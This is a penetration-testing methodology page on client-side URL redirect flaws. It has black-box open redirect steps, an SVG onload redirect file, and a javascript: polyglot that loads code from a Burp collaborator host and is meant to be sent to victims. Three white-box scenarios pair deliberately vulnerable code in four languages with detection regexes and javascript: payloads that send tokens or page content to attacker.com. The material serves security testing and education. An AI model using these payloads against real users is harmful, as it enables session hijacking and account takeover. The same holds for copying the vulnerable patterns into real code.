# Client Side URL Redirect

## Check List

## Methodology

### Black Box

#### [Redirection via /logout](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#redirect-methods) <a href="#b309" id="b309"></a>

{% stepper %}
{% step %}
Open the target application
{% endstep %}

{% step %}
Login using your email and password
{% endstep %}

{% step %}
Verify your mobile OTP
{% endstep %}

{% step %}
You will be redirected to `https://example.com/?landing_uri=example.com`
{% endstep %}

{% step %}
Now modify the URL `https://example.com/logout?redirect_uri=https://evil.com`
{% endstep %}

{% step %}
Upon visiting this URL, you will be `redirected to` without any validation or warning
{% endstep %}
{% endstepper %}

***

#### [Open Redirect via Duplicate parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#common-query-parameters)

{% stepper %}
{% step %}
Log in to the target site and complete the registration process
{% endstep %}

{% step %}
Then use the Burp suite tool to trace the requests and check if you see a parameter called م`continue=` or `next=` that has a url value Like the request below

```url
https://myaccount.example.com/security-checkup/1?continue=https://accounts.examplew.com/...
```
{% endstep %}

{% step %}
Copy the full original URL and append your payload as a second `continue=` parameter

```url
https://myaccount.example.com/security-checkup/1?continue=https://myaccount.example.com/security-checkup/1?continue=https://evil.com
```
{% endstep %}

{% step %}
Open the crafted URL while logged in
{% endstep %}

{% step %}
Click the "Continue" button (or any button that triggers the redirect)
{% endstep %}

{% step %}
If you land on `https://evil.com`, Open Redirect via parameter chaining confirmed
{% endstep %}
{% endstepper %}

***

#### Open Redirect Via Image Upload

{% stepper %}
{% step %}
Go to any profile picture, avatar, logo, or image upload feature on the target
{% endstep %}

{% step %}
Create this exact SVG file locally (save as redirect.svg)

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='http://0vwsb0oeappr3l1za7as1agllcr3fy3n.oastify.com'" xmlns="http://www.w3.org/2000/svg">
  <rect width="100" height="100" fill="red"/>
</svg>
```
{% endstep %}

{% step %}
Go back to the upload feature and upload `redirect.svg` as your new profile `picture/avatar`
{% endstep %}

{% step %}
Intercept the upload POST request with Burp Suite
{% endstep %}

{% step %}
If needed, change Content-Type to `image/svg+xml` or remove it entirely
{% endstep %}

{% step %}
Complete the upload
{% endstep %}

{% step %}
So now go to Collaborator in burp suite and check if a request has been sent or open your profile page or anyone else’s profile who can view your avatar, If you are instantly redirected to `https://evil.com`, Open Redirect via SVG Avatar confirmed
{% endstep %}
{% endstepper %}

***

#### [Account Takeover](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect#filter-bypass)

{% stepper %}
{% step %}
Go to the login page or any `sign-in/auth page` and look for redirect parameters
{% endstep %}

{% step %}
Test basic open redirect first

```url
https://target.com/auth/signin?redirect=https://evil.com
```
{% endstep %}

{% step %}
If you land on `evil.com` after login, Open Redirect confirmed and Now escalate to XSS

```url
https://target.com/auth/signin?redirect=javascript:alert(1)
```
{% endstep %}

{% step %}
If alert pops after clicking “Sign in”, Direct JavaScript execution confirmed
{% endstep %}

{% step %}
If it’s filtered, use this universal bypass payload

```url
https://target.com/auth/signin?redirect=javascript://%250Aalert(1)
```

or

```
https://target.com/auth/signin?redirect=JavaScript://%250A/*?%27/*\%27/*%22/*\%22/*`/*\`/*%26apos;)/*%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\74k%3CK/contentEditable/autoFocus/OnFocus=/${/*/;{/**/(import(/https:\\burpcollab.net/.source))}}//\76--%3E
```
{% endstep %}

{% step %}
Send this exact link to the victim like

```
https://target.com/auth/signin?redirect=JavaScript://%250A/*?%27/*\%27/*%22/*\%22/*`/*\`/*%26apos;)/*%3C!--%3E%3C/Title/%3C/Style/%3C/Script/%3C/textArea/%3C/iFrame/%3C/noScript%3E\74k%3CK/contentEditable/autoFocus/OnFocus=/${/*/;{/**/(import(/https:\\burpcollab.net/.source))}}//\76--%3E
```
{% endstep %}

{% step %}
Victim clicks logs in gets silently redirected your server receives full cookies localStorage session tokens, Account Takeover achieved
{% endstep %}
{% endstepper %}

***

### White Box

#### DOM Execution Hijacking via Pre-Auth SSO RelayState Caching Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on enterprise API Gateways orchestrating Single Sign-On (SSO) via SAML 2.0 or OpenID Connect (OIDC)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the API Gateway's authentication routing and session management logic
{% endstep %}

{% step %}
Identify the "Deep Link Preservation" architecture. When a user accesses a deeply nested, parameterized URL in the Single Page Application (SPA) without an active session (e.g., `[https://spa.enterprise.tld/reports/finance?filter=eyJ](https://spa.enterprise.tld/reports/finance?filter=eyJ)...`), the SPA redirects them to the API Gateway to initiate the SSO sequence
{% endstep %}

{% step %}
Investigate the Gateway's state transmission optimization. Legacy SAML Identity Providers (IdPs) and corporate Web Application Firewalls (WAFs) strictly limit the size of the `RelayState` parameter (often < 80 bytes)
{% endstep %}

{% step %}
Discover the "State Caching" workaround. To preserve massive SPA URLs containing Base64-encoded filters, the API Gateway intercepts the unauthenticated request, generates a short, cryptographic UUID, caches the massive URL in a Redis cluster under that UUID, and transmits only the UUID to the IdP as the `RelayState`
{% endstep %}

{% step %}
Analyze the Post-Authentication routing handoff. Upon successful login, the IdP redirects the user back to the Gateway with the SAML Assertion and the UUID. The Gateway retrieves the cached URL from Redis
{% endstep %}

{% step %}
Understand the Client-Side Routing optimization: To seamlessly hand control back to the SPA's internal routing engine without breaking the browser's history stack via an HTTP 302 redirect, the Gateway returns an HTTP 200 OK containing a JSON payload with the extracted URL
{% endstep %}

{% step %}
Locate the frontend execution sink. The SPA parses the JSON response and pipes the URL directly into `window.location.replace()`&#x20;
{% endstep %}

{% step %}
Discover the fatal trust boundary collapse: The developer assumes that because the cache key is a secure UUID, the cached payload is inherently bound to the authenticated session. They completely overlook that the cache is populated _prior_ to authentication, while the user is entirely anonymous
{% endstep %}

{% step %}
Formulate the Session Fixation payload. You must prime the Gateway's Redis cache with a malicious protocol URI (e.g., `javascript:`), extract the generated UUID, and force a privileged victim to consume it
{% endstep %}

{% step %}
Transmit an unauthenticated SSO initiation request to the Gateway, injecting the payload into the return parameter: `GET /api/v1/sso/init?returnTo=javascript:fetch('[https://attacker.com/?jwt='+localStorage.getItem('token](https://attacker.com/?jwt='+localStorage.getItem('token)'))`&#x20;
{% endstep %}

{% step %}
Intercept the Gateway's HTTP 302 redirect to the IdP. Extract the `RelayState` UUID from the `Location` header. Drop the request
{% endstep %}

{% step %}
Construct a direct login link to the enterprise IdP containing your stolen `RelayState` UUID and distribute it to a highly privileged enterprise administrator
{% endstep %}

{% step %}
The victim authenticates to the IdP. The IdP POSTs the assertion and the poisoned UUID back to the Gateway. The Gateway retrieves your malicious `javascript:` URI from Redis and embeds it into the JSON response. The SPA natively executes the client-side redirect, bypassing the browser's HTTP `Location` safeguards and detonating a fully authenticated DOM XSS payload

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(_redis\.StringSetAsync\(\s*stateId\s*,\s*request\.Query\["returnTo"\]\s*\))|(StringSetAsync\(\s*stateId\s*,\s*.*returnTo)|(cache\.(Set|Add)\(\s*stateId\s*,\s*.*returnTo)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(redisTemplate\.opsForValue\(\)\.set\(\s*stateId\s*,\s*request\.getParameter\("returnTo"\)\s*\))|(opsForValue\(\)\.set\(\s*stateId\s*,\s*.*returnTo)|(redisTemplate\..*returnTo)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(\$redis->setex\(\s*\$stateId\s*,\s*\d+\s*,\s*\$request->query\('returnTo'\)\s*\))|(\$redis->(set|setex)\(.*returnTo)|(Redis.*returnTo)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(redis\.setex\(\s*stateId\s*,\s*\d+\s*,\s*req\.query\.returnTo\s*\))|(redis\.(set|setex)\(\s*stateId\s*,.*returnTo)|(cache\.(set|put)\(\s*stateId\s*,.*returnTo)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
_redis\.StringSetAsync\(stateId,\s*request\.Query\["returnTo"\]|StringSetAsync\(stateId,.*returnTo|cache\.(Set|Add)\(stateId,.*returnTo
```
{% endtab %}

{% tab title="Java" %}
```regexp
redisTemplate\.opsForValue\(\)\.set\(stateId,\s*request\.getParameter\("returnTo"\)\)|opsForValue\(\)\.set\(stateId,.*returnTo|redisTemplate.*returnTo
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$redis->setex\(\$stateId,\s*\d+,\s*\$request->query\('returnTo'\)\)|\$redis->(set|setex)\(.*returnTo|Redis.*returnTo
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
redis\.setex\(stateId,\s*\d+,\s*req\.query\.returnTo\)|redis\.(set|setex)\(stateId,.*returnTo|cache\.(set|put)\(stateId,.*returnTo
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/sso/init")]
public async Task<IActionResult> InitSso([FromQuery] string returnTo)
{
    // [1]
    // [2]
    var stateId = Guid.NewGuid().ToString("N");
    
    // Cache the untrusted URL prior to authentication to bypass SAML length limits
    await _redis.StringSetAsync($"sso:state:{stateId}", returnTo, TimeSpan.FromMinutes(10));

    var idpUrl = $"https://idp.enterprise.com/login?SAMLRequest=...&RelayState={stateId}";
    return Redirect(idpUrl);
}

[HttpPost("/api/v1/sso/callback")]
public async Task<IActionResult> SsoCallback([FromForm] string SAMLResponse, [FromForm] string RelayState)
{
    var isValid = await _samlService.ValidateAssertionAsync(SAMLResponse);
    if (!isValid) return Unauthorized();

    // [3]
    // [4]
    var cachedUrl = await _redis.StringGetAsync($"sso:state:{RelayState}");
    var targetUrl = string.IsNullOrEmpty(cachedUrl) ? "/dashboard" : cachedUrl.ToString();

    // Returns a JSON envelope. The frontend SPA executes:
    // fetch('/api/v1/sso/callback').then(r => r.json()).then(data => window.location.replace(data.redirectUrl));
    return Ok(new { 
        Status = "Authenticated", 
        Token = GenerateJwt(), 
        RedirectUrl = targetUrl // Bypasses HTTP 302 protocol validation
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping("/api/v1/sso/init")
public void initSso(@RequestParam String returnTo, HttpServletResponse response) throws IOException {
    // [1]
    // [2]
    String stateId = UUID.randomUUID().toString().replace("-", "");
    redisTemplate.opsForValue().set("sso:state:" + stateId, returnTo, 10, TimeUnit.MINUTES);

    response.sendRedirect("https://idp.enterprise.com/login?RelayState=" + stateId);
}

@PostMapping("/api/v1/sso/callback")
public ResponseEntity<?> ssoCallback(@RequestParam String RelayState) {
    // [3]
    // [4]
    String cachedUrl = redisTemplate.opsForValue().get("sso:state:" + RelayState);
    
    Map<String, String> payload = new HashMap<>();
    payload.put("token", generateJwt());
    payload.put("redirectUrl", cachedUrl != null ? cachedUrl : "/dashboard");

    return ResponseEntity.ok(payload);
}
```


{% endtab %}

{% tab title="PHP" %}
```php
public function initSso(Request $request)
{
    // [1]
    // [2]
    $stateId = Str::uuid()->getHex();
    Redis::setex("sso:state:{$stateId}", 600, $request->query('returnTo'));

    return redirect("https://idp.enterprise.com/login?RelayState={$stateId}");
}

public function ssoCallback(Request $request)
{
    // [3]
    // [4]
    $stateId = $request->input('RelayState');
    $cachedUrl = Redis::get("sso:state:{$stateId}");

    return response()->json([
        'token' => $this->generateJwt(),
        'redirectUrl' => $cachedUrl ?: '/dashboard'
    ]);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/sso/init', async (req, res) => {
    // [1]
    // [2]
    let stateId = crypto.randomUUID();
    
    // Blindly caching the unauthenticated deep link
    await redis.setex(`sso:state:${stateId}`, 600, req.query.returnTo);

    res.redirect(`https://idp.enterprise.com/login?client_id=...&state=${stateId}`);
});

router.post('/api/v1/sso/callback', async (req, res) => {
    let stateId = req.body.state;
    
    // [3]
    // [4]
    let cachedUrl = await redis.get(`sso:state:${stateId}`);

    // The backend transmits the malicious protocol inside JSON. 
    // The frontend DOM parser evaluates it blindly via window.location.href.
    res.json({
        token: generateToken(),
        redirectUrl: cachedUrl || '/dashboard'
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture bridges legacy enterprise Identity Providers with modern, state-heavy Single Page Applications, \[2] To circumvent rigid WAF and SAML specification size limits on the `RelayState` parameter, engineers optimize the transmission by caching the massive deep link in an external Redis cluster, \[3] The architecture relies heavily on Content-Type boundaries for XSS mitigation. Developers correctly assume that returning an untrusted string inside an `application/json` payload neutralizes standard Reflected XSS, \[4] The execution sink. The developers conflate cryptographic un-guessability with session binding. Because the cache key is generated prior to authentication, the attacker can cleanly separate the payload injection phase from the execution phase. By extracting the generated UUID and forcing a victim to utilize it during their login flow, the attacker maps their pre-authenticated malicious state directly into the victim's highly privileged post-authentication context. The backend blindly wraps the malicious URI scheme in JSON, bypassing the browser's native HTTP `Location` safeguards, and leveraging the SPA's native routing engine to execute a catastrophic DOM-based Client-Side Redirect
{% endstep %}
{% endstepper %}

***

#### Fleet-Wide Redirection via Asynchronous WebSocket Navigation Directives

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on real-time, highly collaborative enterprise environments such as Incident Response platforms, Financial Trading dashboards, or Live Logistics tracking interfaces
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's real-time messaging implementation (e.g., SignalR, Socket.io, Spring WebSockets)
{% endstep %}

{% step %}
Identify the "Synchronized Fleet Navigation" architecture. During severe enterprise events (e.g., a Sev-1 Outage or an urgent security breach), administrators must instantly pull active analysts into a centralized "War Room" dashboard
{% endstep %}

{% step %}
Investigate the latency optimization. Sending an email or an in-app notification that requires manual user interaction creates unacceptable delays. To optimize emergency response times, the backend exposes an API endpoint that broadcasts a `FORCE_NAVIGATE` Remote Procedure Call (RPC) over the active WebSocket connections of all analysts in the tenant
{% endstep %}

{% step %}
Analyze the structure of the WebSocket payload. The payload contains the specific URL of the newly generated War Room (e.g., `{"command": "NAVIGATE", "targetUrl": "[https://ops.enterprise.tld/war-room/INC-1029](https://ops.enterprise.tld/war-room/INC-1029)"}`)
{% endstep %}

{% step %}
Discover the architectural trust assumption: The backend developer assumes that because the API endpoint initiating the broadcast requires Administrative authorization, the contents of the payload are structurally and contextually benign. They blindly interpolate user-provided telemetry (like the external ticketing system's URL or the custom Incident Name) into the `targetUrl` broadcast string without strict protocol validation
{% endstep %}

{% step %}
Locate the Client-Side execution sink. The frontend SPA maintains a global WebSocket listener. Upon receiving the `NAVIGATE` command, it extracts the `targetUrl` and pipes it directly into `window.location.assign()`
{% endstep %}

{% step %}
Formulate the Fleet-Wide Hijacking payload. As a compromised low-level manager or an insider threat possessing permission to escalate an incident, intercept the API request that initiates the WebSocket broadcast
{% endstep %}

{% step %}
Identify the parameter reflected in the `targetUrl` broadcast (e.g., a custom `ThirdPartyBridgeUrl` used to link the platform to Datadog or PagerDuty)
{% endstep %}

{% step %}
Construct a malicious protocol URI utilizing the `javascript:` scheme. Payload: `javascript:fetch('[https://attacker.com/leak?html='+btoa(document.body.innerHTML](https://attacker.com/leak?html='+btoa(document.body.innerHTML)))`&#x20;
{% endstep %}

{% step %}
Submit the Incident Escalation API request containing your payload
{% endstep %}

{% step %}
The backend validates your permission to trigger the escalation. Validation passes. The backend interpolates your payload into the `targetUrl` string and pushes the message to the Redis Pub/Sub backplane
{% endstep %}

{% step %}
The WebSocket cluster broadcasts the message to the active, persistent TCP sockets of all 500 online operations analysts
{% endstep %}

{% step %}
The frontend SPAs of all 500 analysts simultaneously receive the JSON message. Trusting the intra-tenant RPC command, the clients extract the malicious protocol string and pass it to the DOM routing sink. The attacker achieves instantaneous, synchronized DOM XSS and Client-Side Open Redirection across the entire active enterprise operations fleet

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(_hubContext\.Clients\.(Group|User|All)\([^)]*\)\.SendAsync\(\s*["'](?:Navigate|Redirect|NavigateTo)["']\s*,\s*request\.(Url|Query|Body)[^)]+\))|SendAsync\(\s*["']Navigate["']\s*,.*request\.
```
{% endtab %}

{% tab title="Java" %}
```regexp
(messagingTemplate\.convertAndSend\(\s*["']/topic/[^"']*["']\s*,\s*new\s+[A-Za-z]+Event\([^)]*getUrl\(\)\s*\))|(convertAndSend\(.*getUrl\(\)\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(Broadcast::channel\([^)]*\)->emit\(\s*["'](?:Navigate|Redirect)["']\s*,\s*\$request->(?:url|input)\([^)]*\)\s*\))|Broadcast::.*\$request->(url|input)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(io\.to\([^)]*\)\.emit\(\s*['"]force_navigate['"]\s*,\s*\{\s*url\s*:\s*req\.(body|query)\.url\s*\}\s*\))|(socket\.emit\(.*url\s*:\s*req\.(body|query)\.url)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
_hubContext\.Clients\.(Group|User|All)\(.*\)\.SendAsync\("Navigate",.*request\.Url|SendAsync\("Navigate".*request\.
```
{% endtab %}

{% tab title="Java" %}
```regexp
messagingTemplate\.convertAndSend\("/topic/.*",.*NavigationEvent\(.*getUrl\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Broadcast::channel\('.*'\)->emit\('Navigate',.*\$request->url|Broadcast::.*\$request->url
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
io\.to\(.*\)\.emit\('force_navigate',.*url:\s*req\.(body|query)\.url
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/incidents/escalate")]
[Authorize(Roles = "IncidentCommander")]
public async Task<IActionResult> EscalateIncident([FromBody] EscalateRequest request)
{
    // [1]
    // [2]
    var incident = await _dbContext.Incidents.FindAsync(request.IncidentId);
    incident.Severity = "SEV-1";
    await _dbContext.SaveChangesAsync();

    // [3]
    // [4]
    // Blindly interpolates the user-provided 'ExternalBridgeUrl' into the navigation payload.
    // The backend relies on the authorization attribute, ignoring structural validation.
    var targetUrl = string.IsNullOrEmpty(request.ExternalBridgeUrl) 
        ? $"https://ops.enterprise.tld/war-room/{incident.Id}" 
        : request.ExternalBridgeUrl;

    // Dispatches a real-time SignalR command to instantly redirect all connected analysts
    await _hubContext.Clients.Group($"Tenant_{incident.TenantId}").SendAsync("ForceNavigate", targetUrl);

    return Ok();
}

// Frontend Sink (app.js):
// hubConnection.on("ForceNavigate", (url) => { window.location.assign(url); });
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/incidents/escalate")
@PreAuthorize("hasRole('COMMANDER')")
public ResponseEntity<?> escalateIncident(@RequestBody EscalateRequest request) {
    // [1]
    // [2]
    Incident incident = incidentRepository.findById(request.getIncidentId()).orElseThrow();
    incident.setSeverity("SEV-1");
    incidentRepository.save(incident);

    // [3]
    // [4]
    String targetUrl = request.getExternalBridgeUrl() != null ? 
                       request.getExternalBridgeUrl() : 
                       "https://ops.enterprise.tld/war-room/" + incident.getId();

    // Spring WebSockets routing the payload directly to the frontend clients
    NavigationEvent event = new NavigationEvent(targetUrl);
    messagingTemplate.convertAndSend("/topic/tenant-" + incident.getTenantId(), event);

    return ResponseEntity.ok().build();
}
```


{% endtab %}

{% tab title="PHP" %}
```php
class IncidentController extends Controller
{
    public function escalate(Request $request)
    {
        // [1]
        // [2]
        $this->authorize('escalate', Incident::class);

        $incident = Incident::findOrFail($request->input('incident_id'));
        $incident->severity = 'SEV-1';
        $incident->save();

        // [3]
        // [4]
        $targetUrl = $request->input('external_bridge_url') ?: "https://ops.enterprise.tld/war-room/{$incident->id}";

        // Laravel Reverb / WebSockets broadcasting the event
        broadcast(new ForceNavigateEvent($incident->tenant_id, $targetUrl));

        return response()->json(['status' => 'Escalated']);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/incidents/escalate', requireRole('IncidentCommander'), async (req, res) => {
    // [1]
    // [2]
    let incident = await Incident.findByPk(req.body.incidentId);
    incident.severity = 'SEV-1';
    await incident.save();

    // [3]
    // [4]
    let targetUrl = req.body.externalBridgeUrl || `https://ops.enterprise.tld/war-room/${incident.id}`;

    // Socket.io broadcasts the malicious URI scheme to all connected clients in the room
    io.to(`tenant_${incident.tenantId}`).emit('force_navigate', {
        url: targetUrl
    });

    res.send({ status: 'Escalated' });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To minimize Mean-Time-To-Resolution (MTTR) during critical enterprise events, the architecture bypasses manual human coordination in favor of programmatic, synchronized browser orchestration, \[2] The backend exposes an API that translates an administrative state change into a real-time WebSocket broadcast, pushing an autonomous navigation directive to thousands of active client sessions, \[3] The architecture intentionally supports deeply integrating external vendor dashboards (e.g., jumping the entire team to a specific Splunk or Datadog trace), allowing the initiator to specify a custom `ExternalBridgeUrl,` \[4] The execution sink. Developers erroneously equated internal role-based access control (RBAC) with payload safety. By assuming that an authorized administrator would only submit benign `https://` URLs, the backend omitted strict protocol validation. The frontend SPA implicitly trusts intra-tenant RPC commands, blindly pushing the backend's provided string directly into the DOM routing engine. The attacker utilizes this trusted conduit to inject a `javascript:` URI protocol, transforming an organizational orchestration feature into a synchronized, fleet-wide DOM XSS vulnerability that instantly hijacks the active sessions of the entire administrative hierarchy
{% endstep %}
{% endstepper %}

***

#### Universal Deep Link Subversion via Schema-Agnostic JSON Transcoding

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on hyper-scale enterprise platforms supporting massive white-labeling, custom vanity domains, or multi-tenant mobile applications
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application's Universal Deep Linking resolution engine
{% endstep %}

{% step %}
Identify the "Cross-Platform Dispatcher" architecture. When marketing teams generate QR codes or SMS campaigns, they must use a single, universal URL (e.g., `[https://link.enterprise.tld/go/123](https://link.enterprise.tld/go/123)`). When the user clicks the link, the Web SPA loads, fingerprints the user's OS (iOS, Android, Windows), and dynamically redirects them to the appropriate native application
{% endstep %}

{% step %}
Investigate the Schema Retrieval optimization. Because the enterprise platform hosts thousands of distinct tenants, each possessing their own branded mobile applications (e.g., `tenantA-app://`, `acme-corp://`), hardcoding the mobile protocols into the frontend SPA deployment is impossible
{% endstep %}

{% step %}
Discover the backend metadata delivery mechanism. The frontend SPA queries the backend resolution API (`POST /api/v1/dispatch/resolve`). The backend queries the database for the specific Tenant, retrieves the tenant's registered `MobileScheme`, and dynamically concatenates the scheme with the requested resource path
{% endstep %}

{% step %}
Analyze the execution formatting. To allow the frontend to gracefully handle the redirect natively, the backend wraps the concatenated URI in a JSON payload: `{"action": "redirect", "url": "acme-corp://resource/123"}`&#x20;
{% endstep %}

{% step %}
Understand the structural vulnerability: The backend developer relies on the frontend to execute the navigation. By keeping the response entirely within the `application/json` Content-Type, the backend delegates the transport-layer protocol validation entirely to the client's Document Object Model (DOM)
{% endstep %}

{% step %}
Formulate the Schema Poisoning payload. Because the `MobileScheme` is a configurable parameter within the Tenant Administration settings, an attacker can modify their own tenant's configuration to subvert the URI protocol prefix
{% endstep %}

{% step %}
Navigate to the Tenant Configuration API. Locate the parameter defining the mobile application scheme
{% endstep %}

{% step %}
Inject a payload that closes the expected URL syntax and initiates a JavaScript execution block. Since the backend concatenates the string as \[SCHEME]://resource/\[ID], you must craft the scheme to format a valid Javascript execution string while neutralizing the appended path
{% endstep %}

{% step %}
Construct the payload: `javascript:alert(document.cookie);/*`
{% endstep %}

{% step %}
Update the tenant configuration. The backend saves the schema to the database without validating that it is a safe alphanumeric string
{% endstep %}

{% step %}
Distribute the Universal Link (`[https://link.enterprise.tld/go/123?tenant=attacker](https://link.enterprise.tld/go/123?tenant=attacker)`) to a victim on a mobile device
{% endstep %}

{% step %}
The victim's browser loads the SPA. The SPA queries the backend. The backend retrieves the attacker's poisoned schema and returns: `{"url": "javascript:alert(document.cookie);/*://resource/123"}`. The SPA executes `window.location.replace(response.url)`. The `javascript:` protocol overrides the navigation entirely. The browser executes the alert, treating the appended `://resource/123` as a benign JavaScript comment. The attacker has successfully weaponized an administrative configuration field into a zero-click Stored DOM XSS attack against any user interacting with the tenant's public links

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
(return\s+Ok\(\s*new\s*\{\s*url\s*=\s*\$"\{[^}]*Scheme[^}]*\}://[^"]*"\s*\}\))|(return\s+Ok\(\s*new\s*\{[^}]*url\s*=\s*\$".*://)
```
{% endtab %}

{% tab title="Java" %}
```regexp
(return\s+ResponseEntity\.ok\(\s*Map\.of\(\s*"url"\s*,\s*[^)]*(?:getMobileScheme|getScheme)\(\)\s*\+\s*"://)|(Map\.of\(\s*"url".*get.*Scheme.*://)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
(return\s+response\(\)->json\(\s*\[\s*['"]url['"]\s*=>\s*\{?\$[^}]*scheme\}?:\/\/)|(json\(\s*\[.*url.*\$.*scheme.*://)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
(res\.json\(\s*\{\s*url\s*:\s*`?\$\{[^}]*Scheme[^}]*\}://)|(return\s+res\.json\(.*url:.*\$\{.*Scheme.*\}://)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
return\s+Ok\(new\s*\{.*url\s*=\s*\$".*Scheme.*://|Ok\(new\s*\{.*url.*://
```
{% endtab %}

{% tab title="Java" %}
```regexp
ResponseEntity\.ok\(Map\.of\("url".*get.*Scheme.*://|Map\.of\("url".*\+\s*"://
```
{% endtab %}

{% tab title="PHP" %}
```regexp
response\(\)->json\(\['url'.*\$.*scheme.*://|json\(.*url.*\$.*scheme.*://
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.json\(\{.*url:\s*`\$\{.*Scheme.*\}://|res\.json\(.*url:.*://
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPost("/api/v1/dispatch/resolve")]
public async Task<IActionResult> ResolveUniversalLink([FromBody] ResolveLinkRequest request)
{
    var tenant = await _dbContext.Tenants.FindAsync(request.TenantId);

    // [1]
    // [2]
    // [3]
    // [4]
    var targetUrl = $"{tenant.MobileScheme}://{request.ResourcePath}";

    return Ok(new 
    { 
        Action = "redirect", 
        Url = targetUrl 
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("/api/v1/dispatch/resolve")
public ResponseEntity<?> resolveLink(@RequestBody ResolveLinkRequest request) {
    
    Tenant tenant = tenantRepository.findById(request.getTenantId()).orElseThrow();

    // [1]
    // [2]
    // [3]
    // [4]
    String targetUrl = tenant.getMobileScheme() + "://" + request.getResourcePath();

    return ResponseEntity.ok(Map.of(
        "action", "redirect",
        "url", targetUrl
    ));
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class UniversalLinkController extends Controller
{
    public function resolveLink(Request $request)
    {
        $tenantId = $request->input('tenant_id');
        $resourcePath = $request->input('resource_path');

        $tenant = Tenant::findOrFail($tenantId);

        // [1]
        // [2]
        // The backend constructs the Deep Link dynamically to support massive white-labeling
        // [3]
        // [4]
        // The 'mobile_scheme' is configured by the tenant admin. 
        // Failing to restrict it to alphanumeric characters allows protocol poisoning.
        $targetUrl = "{$tenant->mobile_scheme}://{$resourcePath}";

        return response()->json([
            'action' => 'redirect',
            'url' => $targetUrl // Attacker scheme: "javascript:alert(1);/*"
        ]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.post('/api/v1/dispatch/resolve', async (req, res) => {
    let tenant = await Tenant.findByPk(req.body.tenantId);
    
    // [1]
    // [2]
    // [3]
    // [4]
    // String interpolation natively merges the untrusted schema with the resource path
    let targetUrl = `${tenant.mobileScheme}://${req.body.resourcePath}`;

    // SPA execution sink:
    // fetch('/api/v1/dispatch/resolve').then(r=>r.json()).then(d => window.location.replace(d.url));
    res.json({
        action: 'redirect',
        url: targetUrl 
    });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The enterprise employs a unified Universal Link dispatcher, allowing marketing teams to distribute a single URL that seamlessly routes users into the appropriate native mobile application, \[2] To eliminate deployment bottlenecks and support thousands of white-labeled applications, the architecture dictates that the specific native application schema is fetched dynamically from the database, \[3] Developers utilize JSON transcoding to pass the resolved URI back to the frontend SPA, ensuring the redirection logic is strictly handled by the client's DOM parser rather than the backend HTTP transport layer, \[4] The execution sink. The backend developers failed to apply rigorous schema validation (e.g., verifying the string conforms to `^[a-zA-Z0-9\-]+$`) during the tenant configuration phase. By operating under the assumption that administrative inputs are structurally benign, they allowed the attacker to fundamentally alter the URI protocol definition. When the backend synthesizes the final URL, the attacker's injected payload permanently overrides the navigational intent. The frontend SPA blindly consumes the poisoned JSON envelope and executes the DOM-based Client-Side Redirect, weaponizing the platform's core routing infrastructure to distribute zero-click payloads to public users
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
